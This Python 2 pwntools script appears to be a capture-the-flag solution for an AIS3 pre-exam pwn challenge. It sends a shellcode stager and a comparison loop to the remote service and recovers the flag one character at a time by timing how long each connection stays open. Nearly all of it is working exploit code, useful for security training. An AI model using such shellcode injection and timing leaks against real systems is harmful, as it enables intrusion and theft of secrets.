#!/usr/bin/env python2
from pwn import *
import sys, time
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

#r = process('./sc')
#c = sys.argv[1][0]


sc2 = asm('''
    shl ecx, 5
    push rdx
    pop rdi
    lea rsi, [rsp+0x18]
    rep movsb
''')

print len(sc2)

flag = 'AIS'
s = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-+<>?!@#$%^&*()'
i = 0
K = 0x202063

while True:
    try:
        print 'flag:', flag
        print 'now:', s[i]

        sc = asm('''
            mov rax, '{}'
            sub r12, 0x9d0
            add r12, {}
        A:
            inc r9
            cmp BYTE PTR [r12], al
            jz A
        '''.format(s[i], K))
        r = remote('pre-exam-pwn.ais3.org', 10004)
        r.sendafter('shellcode.\n', sc2+sc)
        start = time.time()
        r.recvuntil('AA',timeout=10)
    except EOFError:
        r.close()
        if time.time() - start > 2:
            flag += s[i]
            K += 1
            i = 0
        else:
            i += 1

